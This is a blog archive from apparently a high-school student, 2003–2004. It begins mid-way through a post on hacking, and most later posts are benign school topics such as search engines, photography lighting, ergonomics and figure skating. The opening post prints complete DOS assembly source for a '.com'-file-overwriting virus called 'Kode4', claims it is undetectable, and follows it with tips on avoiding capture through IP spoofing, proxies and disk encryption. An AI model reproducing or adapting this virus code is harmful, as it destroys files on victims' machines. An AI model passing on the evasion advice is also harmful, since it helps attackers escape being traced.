macros, almost anything. Never trust a source unless you're pretty sure its secure. Here is an example of a very simple viruses writen in Assembly that will only .com files. It will stay in one directory or folder so you dont have to worry. Remember, it is just s source code, it will not do any damage. As of right now I think this virus is not detectable.  seg_a segment byte public assume cs:seg_a, ds:seg_a   org 100h V_Length equ last-start KODE4 proc far   start label near ;Check for Virex installiation  mov ax,0ff0fh int 21h cmp ax,0101h ;Abort if Virex Protection je done ; present   mov ah,4Eh ;Find first Com file mov dx,offset filename ;use "*.com"  int 21h   Back:  mov ah,43h ;get rid of read only mov al,0 mov dx,9eh int 21h mov ah,43h mov al,01 and cx,11111110b int 21h  mov ax,3D01h ;Open file for writing mov dx,9Eh ;get file name from file DTA int 21h   mov bx,ax ;save handle in bx mov ah,57h ;get time date mov al,0 int 21h  push cx ;put in stack for later push dx   mov dx,100h ;Start writing at 100h mov cl,v_length ;write 46 bytes mov ah,40h ;Write Data into the file int 21h    pop dx ;Restore old dates and times  pop cx mov ah,57h mov al,01h int 21h    mov ah,3Eh ;Close the file int 21h   mov ah,4Fh ;Find Next file int 21h   jnc Back  mov ah,9h mov dx,offset DATA int 21h  done: int 20h ;Terminate Program filename db "*.c*",0  DATA db " -=+ Kode4 +=-, The one and ONLY!$"   kode4 endp LAST label near seg_a ends end start   Security  Every hacker knows the first rule about hacking- DON’T GET CAUGHT! This could simply be done by using an IP Spoofer, Proxy Server, or encrypting your source and changing the where the address of an attack came from, like changing the “from destination” when sending packets. Encrypting your hard drive is always a good idea for hackers that frequently hack and have a chance of getting traced.  Protecting Yourself  The first thing that you should do in order to get a good security all around your computer is to get an Anti-Virus and a Personal Firewall. Anti-Virus protects you against viruses and worms that may come in the mail, or downloaded from a website. Firewalls keep out hackers from your system and make you feel safe when you are online. I personally have an anti-virus and a firewall and I know that the chances are that I probably wouldn’t get hacked, but expert hackers could get though your firewall in a matter of hours or minutes!  Conclusion  If you don’t know much about computers, networking, programming, then I wouldn’t recommend you hacking, because you’ll find yourself reading lots and lots, before you get anywhere else. If someone attempts to hack you, I would recommend you report that attacker immediately, no matter what’s the cost, because he could hack someone for real and cause a lot of damage to innocent people. People who think that hacking is bad are not stupid. They just don’t know what it really is. I don’t look at it as illegal, as a lot of people may do. The hacking that I do is totally legal and is done only as learning and educational experience. Ethical hackers are those hackers that check security issues and don’t break into systems; they make it so it is more difficult for a hacker to break through.  
+     
+
+    
+</post>
+
+<date>04,December,2003</date>
+<post>
+
+	 
+      Whenever you want to find something, wheather it's pictures, games, articles information, you can find it all using just a simple, and free Search Engine. My favourite one is Google and and Altavista, because I'm used to working with them. You can use any which you want because they're not much of a difference. Yahoo! for example gets its first hits from the advertisers who pay Yahoo!, while if you search on Google, you will get the hits on sites that people had visited most recently, also how many pople have visited that site. So a site with 120,00 people visited will show up on top of the list instead of a site with 100,000 people visited. If you search a lot, you might wanna think about getting a search toolbar. You might already have one but if you don't, then download it from most of the sites. There are options like dictionary and calculator. Choose the one that you want and install it with yout toolbar. When searching, you can narrow your search by typing in the quotes like this: "Toronto Maple Leafs". This way you will get sites exacly with that phrase. If you just type in the words then you will get something like this: Toronto+Maple+Leafs. Click here to run a search on Google>>>  urlLink   ~~Google~~  Click here to run a search on AltaVista>>> urlLink ~~AltaVista~~ 
+     
+
+    
+</post>
+
+<date>31,January,2004</date>
+<post>
+
+	 
+      Finally over, but it wasn't as bad as most people thought it would be. The order which it went , I found was, is very explanatory and understandable. Easy to hard. Of course some people may be strong in geography and weak in math, but in general knowledge, it was easy at first and hard in the last. 1. Math 2. English 3. French 4. Science 5. Geography  The marks will be out soon so just relax for the weekend and be happy. I fould myself relaxing all week actually, but that doesn't mean that this weekend it will be any different. I will be going to a restaurant "buffet" on the weekends so later. 
+     
+
+    
+</post>
+
+<date>12,January,2004</date>
+<post>
+
+	 
+        	There are many image file formats that are used to create and display different images like photographs and web pictures. The main two issues of the image file formats are size and quality. If you are a photographer, you will not need to worry about the size of your images- whether its 10 or 100 megabytes, you will focus on the quality of it, like sharpness and clearness. On the other hand, if you got an old computer with not a lot of disk space, you’ll definitely worry about the size of your images, who wants to have an image that occupies half of their hard drive? Two of the most common image formats today are JPEG and GIF. The extension of the image will tell you in what format it is       (for example, untitled.bmp is in Bitmap format, while untitled.gif is in GIF format.) To find out more information on image file formats,  urlLink click here .    Sources    www.libpng.org/pub/png/ www.dcs.ed.ac.uk/~mxr/gfx/ www.dcs.ed.ac.uk/home/mxr/gfx/2d-hi.html www.scantips.com/basics09.html www.colosseumbuilders.com/imageformats/ compressedimageformats.htm  
+     
+
+    
+</post>
+
+<date>27,February,2004</date>
+<post>
+
+	 
+      Well maybe not... I have Photoshop CS Installer in my computer but I need time to get serial key, because when I bought it for a lot of money, they forgot to put in the serial on the CS Case. Anyway, I got Adobe Photoshop 7.0 instead. Trust me, this program is a bomb. You can practically do anything with this thing so its worth getting it and learning about it. Edit pictures in any way that you want and pat yourself on the back when you're done. A true masterpeice.   Right now, I'm not reallly learnign with Photoshop, but more like playing and exploring. I found that it has a lot of complex and cool features like lens flare, and glowing edges. There is quite a lot of stuff you need to learn to be able to use Photoshop fully.  Here is a ussual toolbar that you will find in most versions in Photoshop:   Here is asome more pictures of This amazing program- Photoshop:    I will write more about Photoshop CS and its new features and differences in a couple of weeks. So stay tooned!!!! 
+     
+
+    
+</post>
+
+<date>19,February,2004</date>
+<post>
+
+	 
+      	CMYK stand for colours cyan, magenta, yellow and the K stands for black. They are commonly used in colour printers. They are also the complementary colours of red, green, and blue. Also cyan, magenta and yellow make black. What? You probably though that adding colours makes white. Well that is the case on a computer monitor, but the printer colours use subtractive colours so it is wise to change RGB to CMYK before printing you images.   Cyan=  green and blue  Magenta=  red and blue  Yellow=  red and green   Red=   yellow and magenta   Green=   yellow and cyan   Blue=   magenta and cyan    *Cyan, magenta, and yellow are subtractive colours. Serve as filters so subtract colours. *Red, green, and blue are addictive colours. Produces by computer monitors.  
+     
+
+    
+</post>
+
+<date>16,February,2004</date>
+<post>
+
+	 
+      Rules of composition are just basic points to help you make a successful looking photograph. I don’t think you have to follow these rules but it’s always the best idea to know them. I will explain you some of the main ones that I know. You don’t have to follow these rules by the way, you can be as creative as you want, but you should at least try to do them.   Point of Interest   	You want your picture to have an important area or object so it is always best to put it there the thirds meet (see Rules of Thirds). Blurring the background could also supply good effects. If you have too many things in your picture, it is going to be hard to decide what your subject is, and where you want viewers to focus.   Rules of Thirds  	I think this is a very important rule. Divide your picture into thirds, so there are nine even squares (3 by 3). You should place your objects or point of interest where the thirds meet, so instead of in the middle, on the sides. Place horizons along the lines dor the best effect.   Contrast   	If you place a dark object over light area, or a light object against a dark area, then you will have more focus on that specific object, as well as emphasis.    Framing   	Framing refers to something that you have in the foreground, that will lead the viewer into the picture, or to look at something important in the background.   Creating Movement   	If you are taking pictures of something moving, or in motion (like a car, plane or a boat), it is best to have it going into the larger part of the frame, so it looks like it has space to go. Don’t place it on the edge, because it will look abnormal.    Other Helpful Tips   	If your photograph has strong lines, try to place them so they’re leading into corners. S shapes also look good, for example streams, fence, human made objects, etc. Reflections provide the viewer a sense of oneness, and gives a feeling of a 3-dimensional looking image.   
+     
+
+    
+</post>
+
+<date>16,February,2004</date>
+<post>
+
+	 
+      What is three-point lighting? Well, as you may know by the name, it is the way of making the pictures better by adding light so it shows the true shape of the object. When you take pictures of 3-D objects, you will have them on printed on a 2-D paper, so you want the picture to look 3-D as much as possible, especially if it’s something important. You can achieve this by adding light so that object to show their true shape whether it is a sphere, cone or a cube. You want to make objects look more clear and evident to their viewers. The three lights that are to take place in the procedure are called; key light, fill light and the back light. Without good lighting, the image looks boring and depressing. Remember, you wouldn’t want to have too much light, so balance is also the key to having a spectacular looking image.   The most dominating light is the key light, because it affects all other lights and changes the way the image looks. Here is an example of oranges that demonstrate an example of key light. Notice how the light coming from the the top left produces shadows and effects on the oranges.   Key Light     So what about the other two kinds of lights- fill and back light. Don't think that they are unimportant because their not. Without all of the three light you won't have a complete looking image. The fill light enlightens the area of objects that is dark, due to the key light. So it’s logical to place it after the key light. Here is an example of fill light and key light in action together. Notice that the image is a little brighter and has more detail.   Key and Fill Light     You may think that key and fill light are enough, but there is still one more detail that you can add using the back light (sometimes called rim light). The back light illuminates the object from the behind, so that the edges appear to show a faint glow, indicating the ending point of an objects or identifying that it is round. Here is an example of a back light that adds more detail and in-depth view at our oranges.   Back Light      Most photographers use these three light to add effects to the image, but there are many more,, but we won’t get into them today. Keep in mind that these 3 kinds of lights could change the look of you whole picture. Below is the finished copy of the picture, providing you with much greater detail that you would have if you didn’t use any special kinds of light at all.  Final Image- key, fill and back light present     Reference: The pictures, concept and scheme of this short explanation on 3-point lighting was taken from  urlLink http://www.andrew-whitehurst.net/3point.html . 
+     
+
+    
+</post>
+
+<date>30,March,2004</date>
+<post>
+
+	 
+      People search the World Wide Web with search engines and directories. They serve the same purpose; find the topic you are looking for. Yahoo! is an example of a directory, because it takes your keyword and looks for the subject in the tree branches. The branches expand to narrow down your search. Each section in the branches is called a category, such as Games, or Movies.          For example, go to Yahoo! And try searching for Splinter Cell. It would probably be like this: Video Games-Splinter Cell. By the way, here is a fun fact. Yahoo is not just a simple word that someone just made up to name the company; it actually stands for Yet Another Hierarchical Officious Oracle. It's okay, I don't get it either. 
+     
+
+    
+</post>
+
+<date>27,March,2004</date>
+<post>
+
+	 
+       2004 Figure Skating World Championships were taken place this week, and I am just astonished! Of course I expected Russia to most certainly win a gold medal, but two? Who would have ever guessed? The championships were taken place in Dortmund, Germany. The two of my favorite events this year were Ice Dancing, and Men Title.   Evgeni Plushenko confidently defended his title. The won the gold medal because of his superior skating on Thursday, March 25th. In second place, with a silver medal came   French Brian Joubert, and in third place, with a bronze medal came Stefan Lindemann of Germany. Yep, I'm afraid the Americans didn't win any medals like they usually do, so first time since 1994. Plushenko the European crown to Brian Joubert with a quite poor performance last month in Budapest, although he fell a few times, he still managed to win. He started off with his signature quadruple toeloop-triple toeloop-double loop, and followed it up with a quadruple toeloop and a triple-double combination, pretty impressive if you ask me!  Plushenko had his third title, was the seventh straight world title for Russian men. The Canadians struggled somewhere in last place. Evgeni Plushenko is just 21 years old and is my favorite skater. Evgeni Plushenko’s triple axel-triple flip was a first in major competition. He also pulled of two quadruple jumps! His marks were extremely high- 6.0 on artistic ability, and 5.9's on technical merit. What can I say, the judges loved him. Mind you, my father's name is also Evgeni, so that just goes to show you something. Here are some pictures of the great Russian skater:  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;   Now in the Ice Dancing section, no one was better than Russia's Tatiana Navka, and Roman Kostomarov from Moscow. They were dancing to the music I least expected. At first I thought it would be something soothing and classical, but it turned out to be no other than the music form Pink Panther and Austin Power soundtrack. All the judges put them in the first place, one however, put them second. When I saw their marks for their technique (5.7 to 5.9), I wasn’t so sure if they would beet the Bulgarians, but the presentation marks were superb- ranged from 5.8 to 6.0 (4 of them).   This is the order in which I have seen the events taken place Wednesday, March 24th. The Bulgarians went and did an extremely good job; I was very impressed with their performance. I though for sure they would grab the gold medal. The Germans went next, pulled of nice techniques and tricks along the way. I was a bit surprised that they managed beat the Ukrainian couple, who went before the Bulgarians. I though that was it, but what’s this? The Russians going last? I was very furious, mind you, going last puts an enormous amount of pressure on you, especially after the extraordinaire performance of the three couples. Of course they seemed to have so too, but despite being nervous, tense, uneasy, and on edge, they handled it better than I imagined. Here are the medal champions of Ice Dancing- Russia's Tatiana Navka/Roman Kostomarov (middle) with Albena Denkova and Maxim Staviski of Bulgaria in second place (left) and with Germany's Kati Winkler and Rene Lohse getting bronze (right).      
+     
+
+    
+</post>
+
+<date>25,March,2004</date>
+<post>
+
+	 
+      Ergonomics changes the way we live; our daily routine, doing work, eating food, anything you can thing of. Some people think that it's a waste of time to spend so much time and energy into making something more comfortable. Ergonomics is basically the function of information regarding humans to the making of objects, systems and environment that we use everyday. Ergonomics is the future of our world and if we are not going to expand on it, then where will we get? Not only does it improve upon the workplace of many people's lives, but also provides research, jobs, and business for this sort of subject.   For example, if there is a big business company, they are working on a really tough project, like a website, and they have a very short deadline. They work overtime; do their best to complete the task. Now working on a website is a very long, and complicated thing, especially for business. Now there are problems, John's vision is getting blurry because he spend too much time on the screen monitor. Amy's hands are not exactly functioning properly. Nick is having trouble with his back. All of sudden the business gets ruined over problems dealing with the science of ergonomically functioning objects. Now you see what a big thing it really is. If the monitor, keyboard and chair were properly designed, then those poor people would have any problems.  In this post, I’m going to show three examples of such objects that make our lives much easier. One of them is a split-pad keyboard that is designed to make our hands feel comfortable while typing. The other one is a filter screen for your computer that protects you from all the bad light that goes into your eyes when you’re on your computer. The chair is also very important because your spine and posture are affected by it.  The screen filter is put on top of your screen monitor, so you are looking at your monitor through the filter, which provides you with eye care. It makes the screen a bit darker, which is not a problem. It also helps to prevent eye soreness and fatigue. I just got one very recently and I have to say, there  is  a big difference. I never expected it to be this better. Now I can work on my computer longer and most efficiently.       The keyboard is very important to business, because everyone types. If you are not in a good position, your hands and fingers will start to be damaged. This keyboard has pad at the bottom, where you keep the palm of your hands, so instead of putting the keyboard on the edge of the desk, you can put it anywhere. You also notice the splitting the two halves of the keyboard. That makes your hands be in a more relaxed position. You normally have to squish your hands together, but now they can be further apart that supplies the user with comfort and pleasure. My friend had this keyboard and when I was on it, it was very different indeed. However, I found it to be very comfortable. I hope many of you will consider this keyboard when purchasing your new computer, even though it's more expensive. In the future, we don't know what will really everything look, but I guess we all hope that the future will be comfortable, friendly, and nice.     The chair is a very important part of the ergonomic functioning object in business industry, because it affects the way we sit down. A bad chair would make your back stiff and could injure you so much that you can’t get to work. A good chair, in fact, could make you more relaxed, give you energy and could be very comfortable to sit in, so the next time you go to work, you would not want to wait any longer, because you very much enjoyed sitting in the chair. Below is an example of a very good, ergonomic chair that would surely do its task in order to keep you comfortable and relaxed:   
+     
+
+    
+</post>
+
+<date>24,March,2004</date>
+<post>
+
+	 
+      I hope that all of you have used a search engine on the Internet. Most people who get a new computer, connect to the Internet, open their browser, and click on the search tool. Then they type in their subject and click search. Many other people, who have had experience with different search engines like  Google , and  AltaVista , are continuously using the same one over and over, just because they are used to it. I like to use Google, and my teacher likes to use AltaVista. I asked them why they like it, and they said that they don’t use any other search engine because they like this one; it suits their preferences and needs.    A definition of a search engine is that it’s a program that searches the web pages for specified keyword that you typed in. Search engines have spiders/robots that look all around the websites for things like authors, content, and subject.   While you could type in the address of your search engine home page, I like to set it as the main page, so the browser loads it automatically. Another thing you can do is put it in your favorites folder. To do this, click  Favorites  on your toolbar, and then go to  Add to Favorites…  Here you can type in the name of the website that you are saving, and put it in the folder that you want to. You can also check the box to make it available offline.  Another thing that you can do, and this is very useful when you like to search a lot, is to download a  search engine toolbar . Almost every search engine has its own toolbar that you can download for free and use it anytime. It appears on your toolbar, and you can hide it, uninstall it, etc.   Here are some pictures of famous search engines.    
+     
+
+    
+</post>
+
+<date>21,March,2004</date>
+<post>
+
+	 
+       Everyone at school had experience with the fabulous Macintosh operating systems. Maybe not. While most people that I know are more likely to get a windows system, there are a lot of other people that prefer to have Macintosh, instead of anything else, even though it costs more money! I mean, when I get my laptop computer, I will surely have Windows installed on it. My old desktop computer, about 20 GB, will likely have Linux on it. Macintosh is probably the most less likely system that I would choose to have. There are many points in my favor, but Macintosh does have its own features.  I believe that Mac OS X Panther, is the latest system of Macintosh. I agree, when looking at the review, that its pretty impressive. Hmm, perhaps its not as bad as I thought it would be... Here are some new features that you'll find inside:  Finder: basically a search tool used to look for files/folders like in Windows Expose: open tile windows and reveal files on your desktop with ease iChat AV: talk with your buddies over the Internet, clear sound quality, chat with graphical video if you include a webcam FileVault: enables hard AES-128 security encryption for your documents Fast User Switching: change from user to user without loogging out and losing data.   There are many more, but most of them are old news. I must agree that Macintosh is very user friendly that any teacher, parent, and student should have no problems using. Here are some of the screenshots of the new Macintosh Panther taken from the official site:       Linux for example, would make an expert from computers panic very often, but Macintosh is very straight forewordd and easy to use. I will be writing more, a lot more, about Linux, because there is just so much about it. Writing scripts, controlling the kernel, using Unix commands, Iptables, and packet filtering are just some of the things that you'll find yourself facing every single day.
+     
+
+    
+</post>
+
+<date>17,March,2004</date>
+<post>
+
+	 
+      I agree with most people that Kazaa is a lousy program that has spyware, lots of advertising, pop-up windows, and much more things that would make you want to erase it from your hard drive. I got it again not a while ago, and frankly I’m a little upset on how it’s an awfully bad program. I only use it if I’m looking for something specific that normal web pages on the Internet would not have.  If you have an MP3 player, then Kazaa would be like a dream come true. Look for all the songs you like, download them like crazy on your computer, and transfer them on your player. Now that sounds like the easy, not expensive, and hassle free thing to do. I however, would never do such a thing and I hope many people with me would do the same. There is a new software called Puretracks, if you ever heard of it, you would know that it’s a program like Morpheus or Kazaa, but in order to download a song, or an album, you have to pay for it. You may ask, why would someone pay for the song if they can get it for free? Well that depends on a lot of things.  Rich people, or people who got money in their pocket that they can waste on anything, would like this idea of downloading music. Average people, who like to spend money on useful things, would have to get used to this new change. I pray everyday that they would close down Kazaa, like they did Napster. A while ago, I saw on television a report that concluded that in about 2-5 years, nobody would be getting CDs anymore. They said that everyone with a CD player would have an MP3 player. When they asked people on the street if their CD player broke, would they buy a new one, or replace it with an MP3 player, most people would get a new CD player.   No one knows what the future holds; all we know is that technology would keep advancing, people’s interest would change, etc. I recently heard that the Japanese invented something that makes DVDs have twice much space, by putting the data on both sides of the disks. Things like this would keep going as far we know it. Your job is to follow along and maybe think of something yourself.  Click  urlLink here  to go to  Puretracks Website . Click  urlLink here  to go to  Kazaa Website  
+     
+
+    
+</post>
+
+<date>15,March,2004</date>
+<post>
+
+	 
+      I’m sure that some of you have heard of this game since its very popular. It’s a shareware game that you could download for free. If you like it, you could get an expansion for like 20 dollars. This game is available to download in  urlLink www.download.com , all you have to do is search for “pocket tanks”.  The game is very simple and quick to play. There are basically two tanks, and you control one of them. You get to pick your weapon that you want to fire at the opposing tank. You have to set the power, and the angle at which you will fire from. Simple right? If not, just check out  urlLink this website .  When you download the game, you get 30 weapons in total. If you wish to buy the Pocket Tanks Deluxe, you get 30 weapons more. When you get the deluxe edition, you can download different packs of weapons, some are free, and some aren’t. My current game at home has 120 weapons that I got. 30 regular, 30 deluxe, plus different packs that I got after the Deluxe Edition. Together it costs me well over 40 dollars. The weapon expansion packs are chaos, power, flamethrower, meteor, nuke, and ambush. Chaos, flamethrower, and nuke have 5 weapons each and are free to download if you have the Pocket Tanks Deluxe edition. The others cost 7.99 and have 15 weapons each.  You might ask why would I pay so much, well because it’s a great game! When I was searching the net after I purchased everything, I found that you could get Pocket Tanks Deluxe for free! It was in some Warez site. And even worse, it had all the weapons packs zipped and free to download! I just burst! That is an awful thing to do, rip someone off the game that they took years to make. Kazaa seemed to have a large number of free Pocket Tanks Deluxe also! If I ever find those people…  Well, anyway, here are some screenshots taken form the official site:    This is where you choose your 10 weapons to begin your match. You take turns with computer, or a human player.   This is where you put your name. When playing against humans, records will be made with the highest scores.   Here is an example of a hailstorm attack. It would do more damage if the tanks is trapped in a hole.Notice how it is running down the hills...   Here is one of the weapons that do 100 damage when hit directly. Sniper Rifle is another example. My other favourite weapons include Power Grid, X-Ray cannon, Fire+Ice, Flower Power, Meteor Shower and Nuke.     
+     
+
+    
+</post>
+
+<date>14,March,2004</date>
+<post>
+
+	 
+      I suppose you have a computer if you’re reading this Blog. The wallpaper of your computer’s desktop may not seem important, but making it look good will improve your mood, so why not spice it up a little bit. If you go to  urlLink www.webshots.com , you will find thousands of photos to choose from such as animals, nature scenes and many more! All you have to do is make an account, download a small file for storing and opening your photos, and just downloading different photos of your choice. There is no spyware or advertisement, so it is a really neat product to own. I currently have 100 photos to choose from and it doesn’t take that much space, considering all the high-tech graphics.  
+     
+
+    
+</post>
+
+<date>12,March,2004</date>
+<post>
+
+	 
+       Ergonomics? I have never heard this word before, until it came up in my computer class. What ergonomics basically is the function of information regarding humans to the making of objects, systems and environment that we use everyday. Ergonomics is connected with virtually everything; sports, health, electronics, household supplies, and furniture.   If it weren’t for people who design objects for comfort, and those who study the principles of ergonomics, everything would be different. Just take a minute to think about it. What do you think that you use frequently is a good example of ergonomics? How about a chair! Believe it or not, people just didn’t stick legs on some wood and sold it. To make good chairs that we sit on today, we had to design a blueprint, test it out on people and see if it is comfortable sitting in the chair for long periods of time. I am still surprised that some of the objects today and very uncomfortable with the better technology than ever before.  Some examples in school that I thought strongly about are Macintosh keyboards and mouse. It is such a pain to type on that keyboard, not mentioning the swelling of my hand and palm over a period of time it had been on the mouse. Of course many mouse and keyboards today grew so comfy that it is just a pleasure to be on computer.  
+     
+
+    
+</post>
+
+<date>11,March,2004</date>
+<post>
+
+	 
+      Databases are used so much everyday that you don't even notice it. Database it a table to store information that could be viewed, or changed. In class, we are doing databases based on movies that we saw. We make a short form for each movie that includes the director, genre, cast, etc.   Can you think of other examples of databases used today? I don't even know where to begin. There are just so many that it’s hard to keep track. For everyone who likes and watches sport games, you should know that every goal, assist, block, save is saved. This is how you could look at your favorite's player statistics. Now imagine that all the players in NHL, are recorded for everything they do, and that includes penalty minutes, goals in overtime, shots on goal, and put all of that in a BIG database. Databases organize the information in a consistent manner and present it to us when we wish to find something out. All we might do is type in a code to view the total goals by the Toronto Maple Leafs. That would gather all the goals from all the players and put it all together. This is usually already done, so like I said, it’s very easy to use if you know how. 
+     
+
+    
+</post>
+
+<date>10,March,2004</date>
+<post>
+
+	 
+      Compressing has become a major step into technology development. What is simply does, is that it takes the binary codes of the program(s) that you wish to compress, and creates a rule, or a patter to shorten the code string.   For example, if you are compressing a Word document and most of the binary code is 001001001001. By compressing the document, the compressor will create a rule that states that 001 will be repeated exactly (x) many times. So the code string will be smaller. Remember, each digit in binary is equal to a bit. So 8 bits would equal a byte. 1000 bytes would equal a kilobyte. 1000 kilobytes would equal a megabyte. 1000 megabytes would equal a gigabyte.  There are many compressing programs out there today, but the most famous and most used program is WinZip. It is usually build into the Os system such as Windows XP. Another program that came out recently is WinRAR, and its a little more advanced. It could compress more space. But usually it doesn't matter what you use. Some programs that you download could be in .rar, or .zip format, so it's a good idea to have both in case you need it. They don't take a lot of space also.  WinZip is currently in version 9.0. Click  urlLink here  to download it. WinRAR is currently in version 3.3. Click  urlLink here  to download it.        
+     
+
+    
+</post>
+
+<date>09,March,2004</date>
+<post>
+
+	 
+      Freeware are found across the Internet. You can download these software free of charge. However, free things may not always seem what they are. They might not work, cause your computer to crash, or contain a trojan or a virus to cause serious threat to your computer.   Basically saying, the author that wrote the freeware software is giving it way for free for people to try it and maybe they will e-mail him comments on how great it is and that he should work on expanding it, or tell him that it's garbage.   Remember, the software is copyrighted, so you may not give away or sell the software as your own, but you could publish it on your website and share it with other people. 
+     
+
+    
+</post>
+
+<date>08,March,2004</date>
+<post>
+
+	 
+      What is Shareware you might ask? Well, its a type of software, that you can try before you actually but it. So think about it as a trial version, where you get some time, or limit to play, and then you can purchase it afterwards if you like it.  Many companies choose to make a trial version of their products in the market for better sales results. Some free trial software are free trial, and some are not. Shareware could be though of as try-it-before-you-buy it type of software. You can find shareware anywhere in adds, esspecially on the Internet.  When you get the software, and you used it over an extended period of time, you are expected to register the program, so you could update it, or have a right to use it. Most shareware could be kept from between 30 - 90 days, and are distributed software, that you could get for free. 
+     
+
+    
+</post>
+
+<date>06,March,2004</date>
+<post>
+
+	 
+      Check out this site. It helped me use different HTML codes that I forgot. It's a one page referance that has almost all the codes that you could hope for. Check it out at this website address that I have found on the Internet:  urlLink http://werbach.com/barebones/barebones.html   Try to create your own website and publish it for free on one of the sites including geocities and angelfire. Have Fun!
+     
+
+    
+</post>
+
+<date>04,March,2004</date>
+<post>
+
+	 
+      If you have a webpage, you might want to add a little music to it. This website right now has a classical song by W. A. Mozart called Serenade Nutchmask. People say they don't like it, but hey, it's classic! Another exaple would be Frank's Blog. Just click it on my sidebar to go to that website. The website has a radio tuned in, so that everytime you go on the webpage, you will hear the current radio.  To add music, you will need to find a .midi file on the Internet, and add html source code to that referance. Go on  urlLink Google , and type html background music, and just browse through. Get the file and put it in your website's source code. My source code looks something like this:  ( )  What does that mean, it means that it would play the gmozart.mid file on the page load automatically, it will keep on going on and on after it ends, and it will be hidden, so you will not see the file in progress, it will play in the background.  Try it yourself, and maybe you will find a song/music right for your page and contents. Here are some pages to look at:   urlLink www.christiananswers.net/midimenu.html    urlLink www.annabella.net/music.html    urlLink www.ricocheting.com/js/music.html    urlLink www.fullnet.com/u/tomg/bgmusic.htm  
+     
+
+    
+</post>
+
+<date>02,March,2004</date>
+<post>
+
+	 
+      If you have a computer, chances are that it is probably run on Windows, if not then Macintosh. But did you ever wonder if there are any more? Well, I will talk about most of the operating systems, their role in our environment and what people use them for. As you noticed, ever little while a new system of Windows comes out. Recently, Windows 98 has been upgraded into Windows Me, then Windows 2000 and finally Windows XP. I have Windows Me and 2000, which is fine for me, because my computers are Pentium 2. So why won't I get Windows XP since it's the latest one? The answer is simple, you need to have at least a specific memory that corresponds with the operating system. Here is a quick chart that you vould refer to (recommended):  Windows 95- 16 MB RAM Windows 98- 24 MB RAM Windows Me-  32 MB RAM Windows 2000- 64 MB RAM Windows XP- 128 MB RAM  I willo be writing more about different operating systems so just folloow along and learn!
+     
+
+    
+</post>
+
+<date>02,March,2004</date>
+<post>
+
+	 
+      I found that Digital Communication Systems are used today are simple and daily communication devices, allowing us to talk to one another via Internet. Whether you type text, or speak into a microphone. The grade 9s have an assignment coming up where you have to research three types of digital communication systems are write an online report about them. Check it out in Mr. Case's blog at  urlLink http://mr-c.blogspot.com .These are the 3 types of communication systems that you should get to know about:  1)  "There"  is sort of like a video game where you have a poerson who who  walk around with and talk with people or participate in activities. Your character is supposed to represent you with a picture. There are many things you could do like buy items and play games. Similar to The Sims game. Found at  urlLink http://www.there.com/   2)  "Skype"  is a program that enables you to talk with audio, so you can talk with someone on your mictophone and listen on your speaker. The creators of the famous peer-to-peer software Kazaa, made this program. From what I hear, it has excellent audio quality. Found at  urlLink http://www.skype.com/   3)  "Friendster"  is like MSN, but the people who you talk to must first be presented or introduced to you, so you can't just add a contact yo your list. This software is ideal for dating and making friends. You can find partners for your single friends as well. Found at  urlLink http://www.friendster.com/ 
+     
+
+    
+</post>
+
+<date>27,April,2004</date>
+<post>
+
+	 
+       As you all know, we have to each design a webpage that has links to sources of computer information. You have a choice to publish your site, or send it by e-mail in a zipped folder to Mr.Case. You can see mine  urlLink here .  Make sure you make your page as simple as possible and easy to read. The reader will likely be someone from the outside of the computer world. It would be better to put your information on tables with 2 columns like I did. If you want, make an introduction paragraph and conclusion paragraph to make it more professional. Don't forget to put your name on it!
+     
+
+    
+</post>
+
+<date>25,April,2004</date>
+<post>
+
+	 
+       If you want to find out a website's IP address you can go to MS-DOS and type  in "ping siteaddress.com". You may ask what is IP address? It stands for Internet protocol. TCP stands for Transmission Control Protocol. IP protocols deal with only packets, but TCP can make a connections between two hosts (users), where they can exchange a flow of data like chatting with MSN Messenger. In case you're wondering, packets are pieces of information transferred over networks, the also contain the destination address. The result of your code will result in something like pinging [ipaddress].     If you want to trace someone's IP address, you go to MS-DOS and type "tracert ipaddress". It will show you all the services that your packet went thought to get to the desired destination. I use it a lot to get the router's IP address like Cisco.      You can also check your current connections if you use the "netstat -n" command at the prompt. It will show you what you are currently are connected to and they’re IP address and the port that they are connected to.   
+     
+
+    
+</post>
+
+<date>23,April,2004</date>
+<post>
+
+	 
+       Technology is always changing around us and we don’t even realize it! That would mean that the products sold by a lot of companies need to keep updated of what the customers need and if they need to change their product. One case that I heard about, involved digital and film cameras. More and more people are beginning to buy and use digital cameras so that would mean that film making companies need to think of what they’re going to do if everyone would be buying a digital cameras, and nobody is buying film cameras.   	The owner usually makes the decision of a small company, or a team of analysts makes the choice for bigger companies. They need to look for products that are increasing in popularity and products that are decreasing in stock. Sometimes, companies make very  bad decisions that cost them over billions of dollars, and sometimes they make really good decisions which make them world breaking event. 
+     
+
+    
+</post>
+
+<date>22,April,2004</date>
+<post>
+
+	 
+       Have you ever though of making your own business somehow? Well a lot of people have started their won business because they want to be their own boss, and merely just make money out of nothing. This may sound all cool, but it is very difficult indeed. You have to make lots and lots of phone calls, and its much more better to do it with some help so it would be better if you have a buddy or someone close. Everyone should try, and if you fail, well at least you had some experience and maybe you learned something. 
+     
+
+    
+</post>
+
+<date>21,April,2004</date>
+<post>
+
+	 
+       Gmail is now available to those people who publish and write in their Blogs. All you have to do is sign in, and you will see the picture writing “Gmail” and you just have to click on it and register your account. I got mine already and it is very easy to use.  First thing you will notice about having Gmail is that you don’t have to erase your messages, because you have 1 GB of Inbox storage of messages. So you will more likely be browsing your mail than finding which ones to delete.  Gmail is in its current Beta form, which means it is testing how well the customers like it and if there are any bugs to report. I found some and reported them immediately because I want the real version to be buggless. Some of features that Gmail has to offer include searching for the exact message that you’re looking for, 1000 megabytes of free storage which means that you will never have to delete another important message, content is organized and grouped with all its replies, no pop-up ads and banners, and now you can see if someone send you a message personally or used your address in a group message.    
+     
+
+    
+</post>
+
+<date>20,April,2004</date>
+<post>
+
+	 
+       Blogger is used to write daily or weekly thoughout the years. What happens when you stop writing like most people will do in my class. I got an idea of transfering all of my posts on my webpage. You can check out my starting webpage at www.geocities.com/nickivasenko. When the year finishes, I will put al of my info on my site, which will last forever, I will organize it so its better to read.    How to make better looking posts   when you write posts, write them in Micosoft Word, so that you can correct all of the spelling mistakes and if the connection fails, you can open it from file. That's what I do, and my posts have improved much better, because I don't have to hurry to get off the Internet if someone would to call me. You can however use Blogger's spelling checker, but I find it horrible and long. With Microsoft Word, you can also use their Thesaurus for better sounding information.    Reward for Publishing   If you don't know already, you can get a 1000 MB storage in GMail, if you write in your blogs plenty. I have already registered an acount and it is very big! Remeber, you can only get one acount per blogger. GMail is like Google Mail, and is currently in its Beta form, so hurry up and get publishing!
